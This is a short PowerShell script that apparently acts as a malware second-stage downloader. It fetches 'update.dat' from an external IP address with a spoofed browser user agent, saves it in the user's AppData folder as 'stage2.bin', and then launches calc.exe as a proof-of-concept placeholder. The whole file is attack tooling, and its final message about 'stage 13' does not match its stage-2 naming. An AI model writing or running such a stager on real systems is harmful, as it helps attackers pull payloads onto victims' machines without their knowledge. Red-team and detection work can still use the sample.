
$PayloadUrl = 'https://203.0.113.100/assets/update.dat'
$WorkingPath = "$env:APPDATA\stage2.bin"
$TransferTimeout = 20
$UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
$ErrorActionPreference = "Stop"

function Invoke-Stage2Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Starting stage 2 transfer"
    $StageResult = Invoke-Stage2Download -SourceUrl $PayloadUrl -DestinationPath $WorkingPath -TimeoutSec $TransferTimeout -UserAgent $UserAgent
    if ($StageResult) {
        Start-Process -FilePath "calc.exe"
    }
}
catch {
    Write-Warning "Stage 2 transfer failed: $($_.Exception.Message)"
}

Set-Location -Path $env:TEMP
Write-Output "stage 13 initialized"
